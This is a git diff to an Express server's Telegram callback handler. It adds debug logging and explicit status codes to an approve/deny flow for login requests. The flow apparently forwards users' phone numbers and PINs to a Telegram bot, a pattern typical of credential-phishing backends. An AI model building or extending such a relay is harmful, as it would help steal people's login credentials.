@@ -14,7 +14,6 @@ app.use(cors({
   allowedHeaders: ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin']
 }));
 
-// Handle preflight requests
 app.options('*', cors());
 
 // Additional CORS headers
@@ -30,7 +29,7 @@ app.use((req, res, next) => {
 });
 
 // ============================================
-// MIDDLEWARE
+// MIDDLEWARE - CRITICAL FOR TELEGRAM CALLBACKS
 // ============================================
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
@@ -123,21 +122,27 @@ async function sendTelegramLoginRequest(phone, pin, requestId) {
 }
 
 // ============================================
-// HANDLE TELEGRAM CALLBACK (Approve/Deny)
+// HANDLE TELEGRAM CALLBACK (Approve/Deny) - FIXED
 // ============================================
 app.post('/api/telegram/callback', async (req, res) => {
   try {
+    // Log the full request body for debugging
+    console.log('📥 Full callback body:', JSON.stringify(req.body, null, 2));
+    
     const { callback_data } = req.body;
 
-    console.log('📥 Callback received:', callback_data);
+    console.log('📥 Callback data:', callback_data);
 
     if (!callback_data) {
+      console.log('❌ No callback_data found');
       return res.status(400).json({ success: false, message: 'No callback data' });
     }
 
     const [action, requestId] = callback_data.split('_');
+    console.log(`📥 Action: ${action}, RequestId: ${requestId}`);
 
     if (!pendingRequests[requestId]) {
+      console.log(`❌ Request ${requestId} not found`);
       return res.status(404).json({ success: false, message: 'Request not found' });
     }
 
@@ -157,14 +162,13 @@ app.post('/api/telegram/callback', async (req, res) => {
         })
       });
 
-      res.json({ success: true, message: 'Login approved' });
+      res.status(200).json({ success: true, message: 'Login approved' });
       
     } else if (action === 'deny') {
       pendingRequests[requestId].status = 'denied';
       console.log('❌ Login denied for request:', requestId);
       console.log('📱 Phone:', pendingRequests[requestId].phone);
 
-      // Send denial to Telegram
       await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -175,9 +179,10 @@ app.post('/api/telegram/callback', async (req, res) => {
         })
       });
 
-      res.json({ success: true, message: 'Login denied' });
+      res.status(200).json({ success: true, message: 'Login denied' });
       
     } else {
+      console.log(`❌ Invalid action: ${action}`);
       res.status(400).json({ success: false, message: 'Invalid action' });
     }
   } catch (error) {
